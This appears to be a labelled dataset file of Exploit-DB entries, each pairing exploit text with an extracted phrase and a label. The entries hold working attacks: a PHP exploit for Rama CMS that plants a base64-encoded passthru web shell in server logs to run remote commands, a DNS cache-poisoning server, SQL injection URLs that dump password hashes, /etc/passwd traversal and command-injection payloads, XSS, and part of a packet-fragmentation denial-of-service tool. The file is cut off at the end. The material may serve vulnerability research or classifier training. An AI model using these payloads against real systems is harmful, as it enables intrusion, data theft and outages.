cc              int     3  FAULT_INSTR_CODE:  4e8d48cc  SYMBOL_STACK_INDEX:  1  SYMBOL_NAME:  nt!ObfDereferenceObjectWithTag+155dd9  FOLLOWUP_NAME:  MachineOwner  MODULE_NAME: nt  IMAGE_NAME:  ntkrnlmp.exe  DEBUG_FLR_IMAGE_TIMESTAMP:  5b1a4590  BUCKET_ID_FUNC_OFFSET:  155dd9  FAILURE_BUCKET_ID:  0x18_OVER_DEREFERENCE_nt!ObfDereferenceObjectWithTag  BUCKET_ID:  0x18_OVER_DEREFERENCE_nt!ObfDereferenceObjectWithTag  PRIMARY_PROBLEM_CLASS:  0x18_OVER_DEREFERENCE_nt!ObfDereferenceObjectWithTag  TARGET_TIME:  2018-06-19T20:33:20.000Z  OSBUILD:  17134  OSSERVICEPACK:  0  SERVICEPACK_NUMBER: 0  OS_REVISION: 0  SUITE_MASK:  272  PRODUCT_TYPE:  1  OSPLATFORM_TYPE:  x64  OSNAME:  Windows 10  OSEDITION:  Windows 10 WinNt TerminalServer SingleUserTS  OS_LOCALE:    USER_LCID:  0  OSBUILD_TIMESTAMP:  2018-06-08 02:00:00  BUILDDATESTAMP_STR:  180410-1804  BUILDLAB_STR:  rs4_release  BUILDOSVER_STR:  10.0.17134.1.amd64fre.rs4_release.180410-1804  ANALYSIS_SESSION_ELAPSED_TIME:  13a4  ANALYSIS_SOURCE:  KM  FAILURE_ID_HASH_STRING:  km:0x18_over_dereference_nt!obfdereferenceobjectwithtag  FAILURE_ID_HASH:  {4139309c-4e9f-52f0-ac5e-4041e7a86a20}  Followup:     MachineOwner ---------  0: kd> !pool ffff8e0db3a0f7a0 Pool page ffff8e0db3a0f7a0 region is Paged pool  ffff8e0db3a0f000 size:  150 previous size:    0  (Free )  FMfn  ffff8e0db3a0f150 size:  130 previous size:  150  (Free)       Free  ffff8e0db3a0f280 size:   40 previous size:  130  (Allocated)  MPan  ffff8e0db3a0f2c0 size:   50 previous size:   40  (Free )  SeAt  ffff8e0db3a0f310 size:   c0 previous size:   50  (Free )  Se    ffff8e0db3a0f3d0 size:   50 previous size:   c0  (Free)       Free  ffff8e0db3a0f420 size:  220 previous size:   50  (Allocated)  FMfn  ffff8e0db3a0f640 size:   a0 previous size:  220  (Allocated)  Sect  ffff8e0db3a0f6e0 size:   50 previous size:   a0  (Free)       Free *ffff8e0db3a0f730 size:  100 previous size:   50  (Free ) *Key  		Pooltag Key  : Key objects  ffff8e0db3a0f830 size:   10 previous size:  100  (Free)       Free  ffff8e0db3a0f840 size:   e0 previous size:   10  (Allocated)  NtFs  ffff8e0db3a0f920 size:   c0 previous size:   e0  (Allocated)  FIcs  ffff8e0db3a0f9e0 size:   c0 previous size:   c0  (Free )  SeTd  ffff8e0db3a0faa0 size:  560 previous size:   c0  (Allocated)  Ntff     Proof of Concept:  I’ve provided a PoC as a C# project. This only demonstrates the issue and proves that it would be possible to force this issue into a UaF even with the mitigations on reference counting.  1) Compile the C# project. It will need to grab the NtApiDotNet from NuGet to work. 2) Run the PoC on an machine with Windows 10 1803, I’ve only tested x64. 3) The OS should crash, inspect it in a kernel debugger or from the crash dump.  Expected Result: The OS ignores the pre-defined key as expected.  Observed Result: The object’s reference count is corrupted.   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/45436.zip",the corrupted object,1
34245,"ArticleFR 11.06.2014 - 'data.php' Privilege Escalation Advisory ID: HTB23219 Product: ArticleFR Vendor: Free Reprintables Vulnerable Version(s): 11.06.2014 and probably prior Tested Version: 11.06.2014 Advisory Publication:  June 11, 2014  [without technical details] Vendor Notification: June 11, 2014  Public Disclosure: July 30, 2014  Vulnerability Type: Improper Access Control [CWE-284] CVE Reference: CVE-2014-4170 Risk Level: High  CVSSv2 Base Score: 7.5 (AV:N/AC:L/Au:N/C:P/I:P/A:P) Solution Status: Solution Available Discovered and Provided: High-Tech Bridge Security Research Lab ( https://www.htbridge.com/advisory/ )   -----------------------------------------------------------------------------------------------  Advisory Details:  High-Tech Bridge Security Research Lab discovered vulnerability in ArticleFR, which can be exploited to execute arbitrary UPDATE SQL statements, alter information stored in database and gain complete control over the web site.   1) Improper Access Control in ArticleFR: CVE-2014-4170  The vulnerability exists due to insufficient access restrictions when accessing the ""/data.php"" script. A remote attacker can send a specially crafted HTTP GET request to vulnerable script and execute arbitrary UPDATE SQL commands in application’s database. Successful exploitation of the vulnerability allows modification of arbitrary database record. A remote attacker can modify or delete information stored in database and gain complete control over the application.   The following exploitation example assigns administrative privileges to the user with ""id=2"":  http://[host]/data.php?pk=2&pkf=id&f=membership&value=admin&t=users  -----------------------------------------------------------------------------------------------  Solution:  Disclosure timeline: 2014-06-11 Vendor Alerted via emails and contact form. 2014-06-19 Vendor Alerted via emails and contact form. 2014-06-24 Vendor Alerted via contact form. 2014-06-26 Fix Requested via emails and contact forms. 2014-06-26 Issue created on GitHub. 2014-06-27 Vendor says that vulnerability is fixed. 2014-06-30 Requested version number with fixes. 2014-07-03 Vendor says that vulnerability will be fixed in upcoming version 3.0.x 2014-07-07 Fix Requested via emails and contact forms. 2014-07-16 Vulnerability still exist in the latest version 3.0.2. This information was brought to vendor. 2014-07-16 Vendor disagrees that vulnerability still exist. 2014-07-27 Vendor locked and limited conversation to collaborators on GitHub. 2014-07-29 Vulnerability still exist in the latest version 3.0.4. 2014-07-30 Public disclosure with self-written patch.  Currently we are not aware of any official solution for this vulnerability. Unofficial patch was developed by High-Tech Bridge Security Research Lab and is available here: https://www.htbridge.com/advisory/HTB23219-patch.zip  -----------------------------------------------------------------------------------------------  References:  [1] High-Tech Bridge Advisory HTB23219 - https://www.htbridge.com/advisory/HTB23219 - Improper Access Control in ArticleFR. [2] ArticleFR - http://freereprintables.com/ - Free Article Directory CMS System . [3] Common Vulnerabilities and Exposures (CVE) - http://cve.mitre.org/ - international in scope and free for public use, CVE® is a dictionary of publicly known information security vulnerabilities and exposures. [4] Common Weakness Enumeration (CWE) - http://cwe.mitre.org - targeted to developers and security practitioners, CWE is a formal list of software weakness types. [5] ImmuniWeb® SaaS - https://www.htbridge.com/immuniweb/ - hybrid of manual web application penetration test and cutting-edge vulnerability scanner available online via a Software-as-a-Service (SaaS) model.  -----------------------------------------------------------------------------------------------  Disclaimer: The information provided in this Advisory is provided ""as is"" and without any warranty of any kind. Details of this Advisory may be updated in order to provide as accurate information as possible. The latest version of the Advisory is available on web page [1] in the References.",send a specially crafted HTTP GET request to vulnerable script and execute arbitrary UPDATE SQL commands in application’s database,1
29640,Shop Kit Plus - 'StyleCSS.php' Local File Inclusion source: https://www.securityfocus.com/bid/22697/info  Shop Kit Plus is prone to a local file-include vulnerability because it fails to adequately sanitize user-supplied data.  An attacker can exploit this vulnerability using directory-traversal strings to execute local script code in the context of the application. This may allow the attacker to access sensitive information that may aid in further attacks.  http://www.example.com/shopkitplus/enc/stylecss.php?changetheme=../../../../../../../../../../../../etc/passwd,using directory-traversal strings,1
2760,"Rama CMS 0.68 - Cookie: lang Local File Inclusion <?  printxploit name: Rama CMS <= 0.68 (Cookie: lang) Local File Include Exploit [Script name: Rama CMS v.0.68 [Script site: http://www.hotscripts.com/jump.php?listing_id=48318&jump_type=1     Find by: Kacper (a.k.a Rahim)   ========>  DEVIL TEAM IRC: irc.milw0rm.com:6667 #devilteam  <======== ========>         http://www.rahim.webd.pl/            <========  Contact: kacper1964@yahoo.pl  (c)od3d by Kacper -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- Greetings DragonHeart and all DEVIL TEAM Patriots :) - Leito & Leon TomZen, Gelo, Ramzes, DMX, Ci2u, Larry, @steriod, Drzewko, CrazzyIwan, Rammstein Adam., Kicaj., DeathSpeed, Arkadius, Michas, pepi, nukedclx, SkD, MXZ, sysios, mIvus, nukedclx, SkD, wacky, xoron -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-                 Greetings for 4ll Fusi0n Group members ;-)                 and all members of hacker.com.pl ;) -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- ';   /* works with register_globals=On  in lang.php line 27-43: .... if(isset($_GET['lang'])){ 	setcookie('lang',htmlspecialchars($_GET['lang'])); 	$lang = htmlspecialchars($_GET['lang']); 	$_COOKIE['lang'] = $lang; }else if(isset($_COOKIE['lang'])){                       //  <-------{1} 	$lang = htmlspecialchars($_COOKIE['lang']); }else{ 	$lang = DEFAUL_LANG; 	$_COOKIE['lang'] = $lang;            //  <-------{2} }  if(file_exists(""language/$lang.php"")){     include_once(""language/$lang.php"");         //  <-------{3} }else{     include_once(""language/en.php""); } ?> .... ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  by Kacper ;) */   if ($argc<4) { print_r(' ----------------------------------------------------------------------------- Usage: php '.$argv[0].' host path cmd OPTIONS host:      target server (ip/hostname) path:      Rama CMS path cmd:       a shell command (ls -la) Options:  -p[port]:    specify a port other than 80  -P[ip:port]: specify a proxy Example: php '.$argv[0].' 2.2.2.2 /Rama_CMS/ ls -la -P1.1.1.1:80 php '.$argv[0].' 1.1.1.1 / ls -la ----------------------------------------------------------------------------- ');  die; }  error_reporting(0); ini_set(""max_execution_time"",0); ini_set(""default_socket_timeout"",5);  function wyslij_pakiety($pakiet) {   global $proxy, $host, $port, $html, $proxy_regex;   if ($proxy=='') {     $ock=fsockopen(gethostbyname($host),$port);     if (!$ock) {       echo 'No response from '.$host.':'.$port; die;     }   }   else { 	$c = preg_match($proxy_regex,$proxy);     if (!$c) {       echo 'Not a valid proxy...';die;     }     $parts=explode(':',$proxy);     echo ""Connecting to "".$parts[0]."":"".$parts[1]."" proxy...\r\n"";     $ock=fsockopen($parts[0],$parts[1]);     if (!$ock) {       echo 'No response from proxy...';die; 	}   }   fputs($ock,$pakiet);   if ($proxy=='') {     $html='';     while (!feof($ock)) {       $html.=fgets($ock);     }   }   else {     $html='';     while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {       $html.=fread($ock,1);     }   }   fclose($ock); } function quick_dump($string) {   $result='';$exa='';$cont=0;   for ($i=0; $i<=strlen($string)-1; $i++)   {    if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))    {$result.=""  ."";}    else    {$result.=""  "".$string[$i];}    if (strlen(dechex(ord($string[$i])))==2)    {$exa.="" "".dechex(ord($string[$i]));}    else    {$exa.="" 0"".dechex(ord($string[$i]));}    $cont++;if ($cont==15) {$cont=0; $result.=""\r\n""; $exa.=""\r\n"";}   }  return $exa.""\r\n"".$result; } $proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)'; function make_seed() {    list($usec, $sec) = explode(' ', microtime());    return (float) $sec + ((float) $usec * 100000); }  $host=$argv[1]; $path=$argv[2]; $cmd="""";  $port=80; $proxy=""""; for ($i=3; $i<$argc; $i++){ $temp=$argv[$i][0].$argv[$i][1]; if (($temp<>""-p"") and ($temp<>""-P"")) {$cmd.="" "".$argv[$i];} if ($temp==""-p"") {   $port=str_replace(""-p"","""",$argv[$i]); } if ($temp==""-P"") {   $proxy=str_replace(""-P"","""",$argv[$i]); } } if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}   echo ""[1] insert evil code in logfiles ...\r\n\r\n""; $hauru = base64_decode(""PD9waHAgb2JfY2xlYW4oKTsvL1J1Y2hvbXkgemFtZWsgSGF1cnUgOy0pZWNobyIuL"". ""i5IYWNrZXIuLkthY3Blci4uTWFkZS4uaW4uLlBvbGFuZCEhLi4uREVWSUwuVEVBTS"". ""4udGhlLi5iZXN0Li5wb2xpc2guLnRlYW0uLkdyZWV0ei4uLiI7ZWNobyIuLi5HbyB"". ""UbyBERVZJTCBURUFNIElSQzogNzIuMjAuMTguNjo2NjY3ICNkZXZpbHRlYW0iO2Vj"". ""aG8iLi4uREVWSUwgVEVBTSBTSVRFOiBodHRwOi8vd3d3LnJhaGltLndlYmQucGwvI"". ""jtpbmlfc2V0KCJtYXhfZXhlY3V0aW9uX3RpbWUiLDApO2VjaG8gIkhhdXJ1IjtwYX"". ""NzdGhydSgkX1NFUlZFUltIVFRQX0hBVVJVXSk7ZGllOz8+"");  $pakiet=""GET "".$p.$hauru."" HTTP/1.0\r\n""; $pakiet.=""User-Agent: "".$hauru."" Googlebot/2.1\r\n""; $pakiet.=""Host: "".$host.""\r\n""; $pakiet.=""Connection: close\r\n\r\n""; wyslij_pakiety($pakiet); sleep(3);  $paths= array ( ""../../../../../var/log/httpd/access_log"", ""../../../../../var/log/httpd/error_log"", ""../apache/logs/error.log"", ""../apache/logs/access.log"", ""../../apache/logs/error.log"", ""../../apache/logs/access.log"", ""../../../apache/logs/error.log"", ""../../../apache/logs/access.log"", ""../../../../apache/logs/error.log"", ""../../../../apache/logs/access.log"", ""../../../../../apache/logs/error.log"", ""../../../../../apache/logs/access.log"", ""../logs/error.log"", ""../logs/access.log"", ""../../logs/error.log"", ""../../logs/access.log"", ""../../../logs/error.log"", ""../../../logs/access.log"", ""../../../../logs/error.log"", ""../../../../logs/access.log"", ""../../../../../logs/error.log"", ""../../../../../logs/access.log"", ""../../../../../etc/httpd/logs/access_log"", ""../../../../../etc/httpd/logs/access.log"", ""../../../../../etc/httpd/logs/error_log"", ""../../../../../etc/httpd/logs/error.log"", ""../../../../../var/www/logs/access_log"", ""../../../../../var/www/logs/access.log"", ""../../../../../usr/local/apache/logs/access_log"", ""../../../../../usr/local/apache/logs/access.log"", ""../../../../../var/log/apache/access_log"", ""../../../../../var/log/apache/access.log"", ""../../../../../var/log/access_log"", ""../../../../../var/www/logs/error_log"", ""../../../../../var/www/logs/error.log"", ""../../../../../usr/local/apache/logs/error_log"", ""../../../../../usr/local/apache/logs/error.log"", ""../../../../../var/log/apache/error_log"", ""../../../../../var/log/apache/error.log"", ""../../../../../var/log/access_log"", ""../../../../../var/log/error_log"" );  for ($i=0; $i<=count($paths)-1; $i++) { $a=$i+2; echo ""["".$a.""] Check Path: "".$paths[$i].""\r\n""; echo ""remote code execution...wait..\n""; $pakiet =""GET "".$p.""lang.php HTTP/1.1\r\n""; $pakiet.=""Cookie: lang=../"".$paths[$i].""%00;\r\n""; $pakiet.=""HAURU: "".$cmd.""\r\n""; $pakiet.=""Host: "".$host.""\r\n""; $pakiet.=""Connection: Close\r\n\r\n""; wyslij_pakiety($pakiet); if (strstr($html,""Hauru"")) { $temp=explode(""Hauru"",$html); die($temp[1]); } } echo ""Exploit err0r :(\r\n""; echo ""Go to DEVIL TEAM IRC: 72.20.18.6:6667 #devilteam\r\n""; ?>  # milw0rm.com [2006-11-12]",a specially crafted .pl file,1
24218,"Symantec Enterprise Firewall 7.0/8.0 - DNSD DNS Cache Poisoning source: https://www.securityfocus.com/bid/10557/info  It is reported that dnsd is prone to a cache poisoning vulnerability.  Dnsd does not ensure that the data returned from a remote DNS server contains related information about the requested records.  An attacker could exploit this vulnerability to deny service to legitimate users by redirecting traffic to inappropriate hosts. Man-in-the-middle attacks, impersonation of sites, and other attacks may be possible.  // PoC poisoning cache attack SEF 8 and later (by fryxar) // Requires poslib 1.0.4 library // Compile: g++ `poslib-config --libs --cflags --server` poc.cpp -o poc  #define POS_DEFAULTLOG #define POS_DEFAULTLOG_STDERR #define POS_DEFAULTLOG_SYSLOG  // Server include file #include <poslib/server/server.h>  // For signal handling #include <stdlib.h> #include <signal.h>  char *dyndomain;  DnsMessage *my_handle_query(pending_query *query);  void cleanup(int sig) {  // close down the server system  pos_setquitflag(); }  int main(int argc, char **argv) { _addr a;   try {    /* get command-line arguments */    if (argc != 2 ) {      printf( ""Usage: %s [domainname]\n"", argv[0] );      return 1;    } else {      dyndomain = argv[1];      txt_to_addr(&a, ""any"");    }     poslib_config_init();     /* bring up posadis */    servers.push_front(ServerSocket(ss_udp, udpcreateserver(&a)));     // use the posadis logging system    pos_log(context_none, log_info, ""Proof of concept DNS server starting up..."");     // set signal handlers    signal(SIGINT, cleanup);    signal(SIGTERM, cleanup);     // set query function    handle_query = my_handle_query;     // run server    posserver_run();  } catch (PException p) {    printf(""Fatal exception: %s\n"", p.message);    return 1;  }   return 0; }  /* the entry function which will handle all queries */ DnsMessage *my_handle_query(pending_query *query) {  DnsMessage *a = new DnsMessage();  DnsQuestion q;  DnsRR rr;   /* set a as an answer to the query */  a->ID = query->message->ID;  a->RD = query->message->RD;  a->RA = false;   if (query->message->questions.begin() == query->message->questions.end()) {    /* query did not contain question */    a->RCODE = RCODE_QUERYERR;    return a;  }  q = *query->message->questions.begin();  a->questions.push_back(q);  a->QR = true;   pos_log(context_server, log_info, ""Query: [%s,%s]"", q.QNAME.tocstr(), str_qtype(q.QTYPE).c_str());   if (q.QTYPE == DNS_TYPE_A && q.QNAME == dyndomain) {    rr = DnsRR(dyndomain, DNS_TYPE_A, CLASS_IN, 3600);    string data = rr_fromstring(DNS_TYPE_A, ""200.200.200.200""); // Anything...    rr.RDLENGTH = data.size();    rr.RDATA = (char *)memdup(data.c_str(), data.size());    a->answers.push_back(rr);     rr = DnsRR(""org"", DNS_TYPE_NS, CLASS_IN, 3600);    data = rr_fromstring(DNS_TYPE_NS, ""fakedns.com"");    rr.RDLENGTH = data.size();    rr.RDATA = (char *)memdup(data.c_str(), data.size());    a->authority.push_back(rr);     rr = DnsRR(""fakedns.com"", DNS_TYPE_A, CLASS_IN, 3600);    data = rr_fromstring(DNS_TYPE_A, ""200.200.200.201""); // Anything...    rr.RDLENGTH = data.size();    rr.RDATA = (char *)memdup(data.c_str(), data.size());    a->additional.push_back(rr);  } else {    /* we don't want this */    a->RCODE = RCODE_SRVFAIL;  }  return a; } ######################################################### # End poc.cpp #########################################################",redirecting traffic to inappropriate hosts,1
20246,"TalentSoft Web+ Application Server (Linux) 4.6 - Example Script File Disclosure source: https://www.securityfocus.com/bid/1725/info  Web+ is a development language for use in creating web-based client/server applications.  In Linux versions of the product, an example script installed in Web+ (Web+Ping) which fails to correctly filter shell meta characters. As a result, parameters passed to this script may contain malicious shell commands, allowing an attacker to remotely execute or read any file which is accessible by the Web+ user.  Windows NT versions of Web+ are apparently not vulnerable.  To exploit simply place a '|' after the parameter you which to provide to ping and then the command you wish to execute.  e.g: Goto: http://target/cgi-bin/webplus.cgi?Script=/webplus/webping/webping.wml  Then type in host destination box: 127.0.0.1 | cat /etc/passwd  You will then be presented with the contents of the /etc/passwd file.",malicious shell commands,1
32264,Freeway 1.4.1.171 - '/french/account_newsletters.php?language' Traversal Local File Inclusion source: https://www.securityfocus.com/bid/30731/info    Freeway is prone to multiple local file-include vulnerabilities because it fails to properly sanitize user-supplied input.    An attacker can exploit these vulnerabilities using directory-traversal strings to view local files in the context of the webserver process. This may aid in further attacks.    Freeway 1.4.1.171 is vulnerable; other versions may also be affected.  http://www.example.com/[installdir]/includes/languages/french/account_newsletters.php? language=../../../../../../../../../../../../../etc/passwd%00,directory-traversal strings to view local files in the context of the webserver process,1
25772,"Qualiteam X-Cart 4.0.8 - 'register.php?mode' SQL Injection source: https://www.securityfocus.com/bid/13817/info               X-Cart is prone to SQL injection and cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.               These vulnerabilities could permit remote attackers to pass malicious input to database queries, resulting in modification of query logic or other attacks. Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation. An attacker may also steal cookie-based authentication credentials and carry out other attacks.               X-Cart 4.0.8 is reportedly vulnerable. Other versions may be affected as well.  http://www.example.com/register.php?mode='[SQL-inj]",malicious input,1
22907,"ES CmS 0.1 - SQL Injection ﻿# Exploit Title: ES CmS 0.1 Sql Injection Vulnerability  # Google Dork: inurl:/page.php?id=  # Date: 2012  # Exploit Author: MR.XpR  # Software Link: http://es-cms.com , http://sourceforge.net/projects/escms/files/esCMS Alpha/0.1/escms_alpha_v0_1.zip  # Version: v.0.1  # Tested on: BT , 7   # Poc :  http://localhost/page.php?id=[sqli]   # D3mo :   http://server/page.php?id=-1+union+select+1,2,3,group_concat(column_name),5,6+from+information_schema.c​olumns+where+table_name=char(table_cod)  http://server/page.php?id=-1+union+select+1,2,3,group_concat(nazwa,0x3a,haslo),5,6+from+es_cms_users   # TNx To :   My Brothers Siamak.Black(Black.Boy) , UnknowN   everything is not true ,The real is dream",a malicious manner,1
27807,Fast Click SQL Lite 1.1.2/1.1.3 - 'show.php' Remote File Inclusion source: https://www.securityfocus.com/bid/17819/info  Fast Click SQL Lite is prone to a remote file-include vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.  An attacker can exploit this issue to include an arbitrary remote file containing malicious PHP code and execute it in the context of the webserver process. This may allow the attacker to compromise the application and the underlying system; other attacks are also possible.  This issue is reported to affect versions 1.1.3 and prior.  http://www.example.com/[path]/show.php?path=http://www.example.com/cmd.gif?&cmd=uname -a,include an arbitrary remote file containing malicious PHP code and execute it in the context of the webserver process,1
20855,"Wiki Web Help 0.3.9 - Multiple Persistent Cross-Site Scripting Vulnerabilities # Exploit Title: Multiple Stored XSS Vulnerabilities in Wiki Web Help. # Date: 23/08/2012 # Exploit Author: Shai rod (@NightRang3r) # Vendor Homepage: http://wikiwebhelp.org # Software Link: http://sourceforge.net/projects/wwh/files/wwh-0.3.9.7z/download # Version: 0.3.9  #Gr33Tz: @aviadgolan , @benhayak, @nirgoldshlager, @roni_bachar   About the Application: ======================  AJAX based wiki designed to operate like a desktop help viewer(chm).   Vulnerability Description =========================  1. Stored XSS in Edit Tags.  Steps to reproduce the issue:  1.1. Click ""Edit Tags"" 1.2. In the ""Tags"" field insert the Javascript payload: <img src='1.jpg'onerror=javascript:alert(""XSS"")> 1.3. Click the ""Update"" button.    2. Stored XSS in Node Name.  Steps to reproduce the issue:  2.1. Right click on an object in the Contents tree on the left side of the page. 2.2. In the ""Node Option"" window select ""Add"". 2.3. In the ""New Page Name"" field insert the Javascript payload: <img src='1.jpg'onerror=javascript:alert(""XSS"")>  * Both XSS will be triggered on all users visiting the Wiki.   3. Stored XSS in Page Body (href).  Steps to reproduce the issue:  3.1. Choose a Page. 3.2. Click ""Edit"". 3.2. In the Page editor insert: [javascript:alert(/XSS/),Click Me]  3.3. Click the ""Save"" button.  XSS Will be triggerd once the user clicks on the link.",a specially crafted .jpg file,1
27761,NeoMail - 'NeoMail.pl?sessionid' Cross-Site Scripting source: https://www.securityfocus.com/bid/17728/info  NeoMail is prone to a cross-site scripting vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.   An attacker may leverage this issue to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  A successful exploit of this issue may grant an attacker full access to a victim user's NeoMail account.  http://www.example.com:2095/user+site.com/neomail.pl?sessionid=<script>alert(document.cookie)</script><!--,a specially crafted .pl file,1
47266,"Microsoft Font Subsetting - DLL Heap Corruption in ReadAllocFormat12CharGlyphMapList -----=====[ Background ]=====-----  The Microsoft Font Subsetting DLL (fontsub.dll) is a default Windows helper library for subsetting TTF fonts; i.e. converting fonts to their more compact versions based on the specific glyphs used in the document where the fonts are embedded. It is used by Windows GDI and Direct2D, and parts of the same code are also found in the t2embed.dll library designed to load and process embedded fonts.  The DLL exposes two API functions: CreateFontPackage and MergeFontPackage. We have developed a testing harness which invokes a pseudo-random sequence of such calls with a chosen font file passed as input. This report describes a crash triggered by a malformed font file in the fontsub.dll code through our harness.  -----=====[ Description ]=====-----  We have encountered the following crash in fontsub!ReadAllocFormat12CharGlyphMapList:  --- cut --- (5a30.397c): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. FONTSUB!ReadAllocFormat12CharGlyphMapList+0x13d: 00007fff`c086cf8d 448904c8        mov     dword ptr [rax+rcx*8],r8d ds:00000225`050b9000=????????  0:000> ? rax Evaluate expression: 2358021689232 = 00000225`050b8f90  0:000> ? rcx Evaluate expression: 14 = 00000000`0000000e  0:000> ? r8d Evaluate expression: 4294967286 = 00000000`fffffff6  0:000> !heap -p -a rax     address 00000225050b8f90 found in     _DPH_HEAP_ROOT @ 22505011000     in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)                              22505012478:      225050b8f90               68 -      225050b8000             2000     00007fffcf6530df ntdll!RtlDebugAllocateHeap+0x000000000000003f     00007fffcf60b52c ntdll!RtlpAllocateHeap+0x0000000000077d7c     00007fffcf59143b ntdll!RtlpAllocateHeapInternal+0x00000000000005cb     00007fff9b90be42 vrfcore!VfCoreRtlAllocateHeap+0x0000000000000022     00007fffcca398f0 msvcrt!malloc+0x0000000000000070     00007fffc086fd1e FONTSUB!Mem_Alloc+0x0000000000000012     00007fffc086cf24 FONTSUB!ReadAllocFormat12CharGlyphMapList+0x00000000000000d4     00007fffc08706cd FONTSUB!ModCmap+0x0000000000000459     00007fffc0866eab FONTSUB!CreateDeltaTTFEx+0x0000000000000413     00007fffc0866a63 FONTSUB!CreateDeltaTTF+0x00000000000002cb     00007fffc086132a FONTSUB!CreateFontPackage+0x000000000000015a [...]   0:000> k  # Child-SP          RetAddr           Call Site 00 000000ad`62cfd4b0 00007fff`c08706cd FONTSUB!ReadAllocFormat12CharGlyphMapList+0x13d 01 000000ad`62cfd520 00007fff`c0866eab FONTSUB!ModCmap+0x459 02 000000ad`62cfd660 00007fff`c0866a63 FONTSUB!CreateDeltaTTFEx+0x413 03 000000ad`62cfd780 00007fff`c086132a FONTSUB!CreateDeltaTTF+0x2cb 04 000000ad`62cfd8c0 00007ff6`1a8a85d1 FONTSUB!CreateFontPackage+0x15a [...] --- cut ---  The issue reproduces on a fully updated Windows 10 1709; we haven't tested earlier versions of the system. It could be potentially used to execute arbitrary code in the context of the FontSub client process. It is easiest to reproduce with PageHeap enabled, but it is also possible to observe a crash in a default system configuration. Attached are 3 proof of concept malformed font files which trigger the crash.   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47266.zip",a malformed font file in the fontsub.dll code through our harness,1
24636,"Microsoft Windows XP - TCP Packet Fragmentation Handling Denial of Service (3) // source: https://www.securityfocus.com/bid/11258/info    Multiple vendor implementations of the TCP stack are reported prone to a remote denial-of-service vulnerability.    The issue is reported to present itself due to inefficiencies present when handling fragmented TCP packets.    The discoverer of this issue has dubbed the attack style the ""New Dawn attack""; it is a variation of a previously reported attack that was named the ""Rose Attack"".    A remote attacker may exploit this vulnerability to deny service to an affected computer.    Microsoft Windows 2000/XP, Linux kernel 2.4 tree, and undisclosed Cisco systems are reported prone to this vulnerability; other products may also be affected.   /*-------------------------------------------------------------*/ /*   Implementation of Rose Attack described by Gandalf gandalf at digital.net   Reference: Bugtraq, 30 mars 2004, ""IPv4 fragmentation, The Rose Attack""    NewDawn3.c written by Ken Hollis based on the code rose.c   written by Laurent Constantin and rose2.c written by chuck   modified from large IGMP attack by Kox by Coolio (coolio (at) k-r4d.com)    Program allows choice of TCP or UDP, number of packets to fragment, number   of fragments per packet and number of times the last fragment is   rewritten.    Based on a conversation where it was mentioned that a highly fragmented   packet would cause high CPU utilization if the last fragment was written   over and over again.  As chuck says, death by a thousand cuts.      NewDawn3 send 32 byte fragments.  See:   http://digital.net/~gandalf/Rose_Frag_Attack_Explained.htm     Usage : ./NewDawn3 type(1or2) ipaddress [port] [NumP] [Numt] [NumR] [NumF] [NumD]  Example: ./NewDawn3 1 1.2.3.4 80 5 9999 99999999 4080 2    type      : 1=tcp, 2=udp    ipaddress : address to test    port      : optional port number (0 means random)    NumP      : Number of packets to fragment (less than 1000)    NumT      : Number of times last fragment is rewritten    NumR      : Number of times to run test    NumF      : Number of fragments per packet    NumD      : Delta between fragements.  8 = 32 bytes blank                64 bytes total between fragments (32 bytes  	       payload + 32 bytes blank = 64 bytes),                5 = 8 bytes blank (32 bytes payload + 8 bytes 	       blank = 40 bytes total = 5 * 8). 	       < 5 = overlapping fragments     Library netwib must be installed:     http://www.laurentconstantin.com/en/netw/netwib/     http://go.to/laurentconstantin    To compile and run :     gcc -Wall -o NewDawn3 NewDawn3.c `netwib-config -lc`     ./NewDawn3 1 www.example.com 80      The command:     ./NewDawn3 1 10.12.14.16     Is equivalent to:     ./NewDawn3 1 10.12.14.16 0 5 9999 99999999 1021 8     Where:     ./NewDawn3 = Program Name     1 = TCP     10.12.14.16 = IP Address     0 = Random port numbers     5 = Five packets to fragment before staring next set of packets     9999 = The number of times to rewrite the last fragment of            the five packets     99999999 = The number of times to run this entire attack     1021 = The number of middle fragments to write.     8 = 64 bytes between 32 byte fragments (8 bytes * 8 = 64)    This was successfully tested with netwib 5.12.0, under Linux   to test a Windows 2000 host. Local network is Ethernet. */  /*-------------------------------------------------------------*/ // Test large number of packets #define NUM_PACKETS 1000 #define NUM_LAST 9999 #define NUM_RUN 99999999 #define NUM_FRAG 8170 #define NUM_DELTA 8  #include <stdlib.h> #include <stdio.h> #include <netwib.h>  /*-------------------------------------------------------------*/ typedef enum {   ROSE_TYPE_TCP = 1,   ROSE_TYPE_UDP = 2 } rose_type;  /*-------------------------------------------------------------*/ typedef struct {   rose_type type;   netwib_ip ipad;   netwib_port port;   netwib_bool display;   netwib_buf buf;   netwib_io *pio; } rose_params;  /*-------------------------------------------------------------*/ static netwib_err rose_loop(rose_params *prp, int npack, int nrew,  		int nrun, int nfrag, int ndelta) {   netwib_iphdr ipheader, ipstore[NUM_PACKETS];   netwib_tcphdr tcpheader, tcpstore[NUM_PACKETS];   